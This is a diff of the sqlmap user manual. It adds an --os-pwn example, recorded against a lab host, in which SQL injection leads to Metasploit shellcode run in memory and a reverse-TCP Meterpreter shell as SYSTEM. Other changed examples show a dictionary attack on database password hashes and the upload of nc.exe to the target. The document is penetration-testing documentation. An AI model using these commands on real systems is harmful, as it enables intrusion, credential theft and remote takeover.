@@ -1707,7 +1707,7 @@ spaces and capital <CODE>SELECT</CODE> string are banned:</P>
 <BLOCKQUOTE><CODE>
 <PRE>
 $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper \
-tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+  tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
 
 [hh:mm:03] [DEBUG] cleaning up configuration parameters
 [hh:mm:03] [INFO] loading tamper script 'between'
@@ -2005,8 +2005,8 @@ back-end DBMS: PostgreSQL
 [hh:mm:38] [INFO] fetching database users password hashes
 do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
 [hh:mm:42] [INFO] using hash method: 'postgres_passwd'
-what's the dictionary's location? [/tmp/sqlmap/txt/wordlist.txt] 
-[hh:mm:46] [INFO] loading dictionary from: '/tmp/sqlmap/txt/wordlist.txt'
+what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt] 
+[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
 do you want to use common password suffixes? (slow!) [y/N] n
 [hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
 [hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
@@ -2364,6 +2364,39 @@ across the DBMS.</P>
 <P>The list of common table names is <CODE>txt/common-tables.txt</CODE> and you
 can edit it as you wish.</P>
 
+<P>Example against a MySQL 4.1 target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" \
+  --common-tables -D testdb --banner
+
+[...]
+[hh:mm:39] [INFO] testing MySQL
+[hh:mm:39] [INFO] confirming MySQL
+[hh:mm:40] [INFO] the back-end DBMS is MySQL
+[hh:mm:40] [INFO] fetching banner
+web server operating system: Windows
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS operating system: Windows
+back-end DBMS: MySQL &lt; 5.0.0
+banner:    '4.1.21-community-nt'
+
+[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
+[hh:mm:40] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] 8
+[hh:mm:43] [INFO] retrieved: users
+[hh:mm:56] [INFO] retrieved: Users
+
+Database: testdb
+[1 table]
++-------+
+| users |
++-------+
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
 
 <H3>Brute force columns names</H3>
 
@@ -2461,7 +2494,7 @@ back-end DBMS: Microsoft SQL Server 2005
 
 [hh:mm:50] [INFO] fetching file: 'C:/example.exe'
 [hh:mm:50] [INFO] the SQL query provided returns 3 entries
-C:/example.exe file saved to:    '/tmp/sqlmap/output/192.168.136.129/files/C__example.exe'
+C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'
 [...]
 
 $ ls -l output/192.168.136.129/files/C__example.exe 
@@ -2493,14 +2526,14 @@ handle it properly.</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ file /tmp/nc.exe.packed 
-/tmp/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
+$ file /software/nc.exe.packed 
+/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
 
-$ ls -l /tmp/nc.exe.packed
--rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /tmp/nc.exe.packed
+$ ls -l /software/nc.exe.packed
+-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
 
 $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
-  "/tmp/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
+  "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
 
 [...]
 [hh:mm:29] [INFO] the back-end DBMS is MySQL
@@ -2513,7 +2546,7 @@ do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been success
 written on the back-end DBMS file system? [Y/n] y
 [hh:mm:52] [INFO] retrieved: 31744
 [hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, 
-same size as the local file '/tmp/nc.exe.packed'
+same size as the local file '/software/nc.exe.packed'
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -2583,8 +2616,8 @@ only be deleted manually
 </P>
 
 <P>It is also possible to simulate a real shell where you can type as many
-arbitrary commands as you wish. The option is <CODE>-</CODE><CODE>-os-shell</CODE> and has
-the same TAB completion and history functionalities that
+arbitrary commands as you wish. The option is <CODE>-</CODE><CODE>-os-shell</CODE>
+and has the same TAB completion and history functionalities that
 <CODE>-</CODE><CODE>-sql-shell</CODE> has.</P>
 
 <P>Where stacked queries has not been identified on the web application
@@ -2662,11 +2695,108 @@ slide deck
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int_51.aspx?id=1" \
-  --os-pwn -v 1 --msf-path /tmp/metasploit
+$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn \
+  --msf-path /software/metasploit
 
 [...]
-TODO
+[hh:mm:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003
+web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
+back-end DBMS: MySQL 5.0
+[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
+how do you want to establish the tunnel?
+[1] TCP: Metasploit Framework (default)
+[2] ICMP: icmpsh - ICMP tunneling
+> 
+[hh:mm:32] [INFO] testing if current user is DBA
+[hh:mm:32] [INFO] fetching current user
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+> 
+[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
+[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
+[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
+[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
+how do you want to execute the Metasploit shellcode on the back-end database underlying 
+operating system?
+[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
+[2] Stand-alone payload stager (file system way)
+> 
+[hh:mm:35] [INFO] creating Metasploit Framework 3 multi-stage shellcode 
+which connection type do you want to use?
+[1] Reverse TCP: Connect back from the database host to this machine (default)
+[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports 
+between the specified and 65535
+[3] Bind TCP: Listen on the database host for a connection
+> 
+which is the local address? [192.168.136.1] 
+which local port number do you want to use? [60641] 
+which payload do you want to use?
+[1] Meterpreter (default)
+[2] Shell
+[3] VNC
+> 
+[hh:mm:40] [INFO] creation in progress ... done
+[hh:mm:43] [INFO] running Metasploit Framework 3 command line interface locally, please wait..
+
+                                  _
+                                 | |      o
+ _  _  _    _ _|_  __,   ,    _  | |  __    _|_
+/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
+  |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
+                           /|
+                           \|
+
+
+       =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
++ -- --=[ 674 exploits - 351 auxiliary
++ -- --=[ 217 payloads - 27 encoders - 8 nops
+       =[ svn r12272 updated 4 days ago (2011.04.07)
+
+PAYLOAD => windows/meterpreter/reverse_tcp
+EXITFUNC => thread
+LPORT => 60641
+LHOST => 192.168.136.1
+[*] Started reverse handler on 192.168.136.1:60641 
+[*] Starting the payload handler...
+[hh:mm:48] [INFO] running Metasploit Framework 3 shellcode remotely via UDF 'sys_bineval', 
+please wait..
+[*] Sending stage (749056 bytes) to 192.168.136.129
+[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) at Mon Apr 11 
+hh:mm:52 +0100 2011
+
+meterpreter > Loading extension espia...success.
+meterpreter > Loading extension incognito...success.
+meterpreter > [-] The 'priv' extension has already been loaded.
+meterpreter > Loading extension sniffer...success.
+meterpreter > System Language : en_US
+OS              : Windows .NET Server (Build 3790, Service Pack 2).
+Computer        : W2K3R2
+Architecture    : x86
+Meterpreter     : x86/win32
+meterpreter > Server username: NT AUTHORITY\SYSTEM
+meterpreter > ipconfig
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+
+
+Intel(R) PRO/1000 MT Network Connection
+Hardware MAC: 00:0c:29:fc:79:39
+IP Address  : 192.168.136.129
+Netmask     : 255.255.255.0
+
+
+meterpreter > exit
+
+[*] Meterpreter session 1 closed.  Reason: User exit
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -2987,7 +3117,7 @@ a <CODE>&lt;DB_NAME&gt;/&lt;TABLE_NAME&gt;.csv</CODE> file into
 
 <P>You can then use sqlmap itself to read and query the locally created
 SQLite 3 file. For instance, <CODE>python sqlmap.py -d
-sqlite:///tmp/sqlmap/output/192.168.136.131/dump/testdb.sqlite3 --table</CODE>.</P>
+sqlite:///software/sqlmap/output/192.168.136.131/dump/testdb.sqlite3 --table</CODE>.</P>
 
 
 <H3>Simple wizard interface for beginner users</H3>
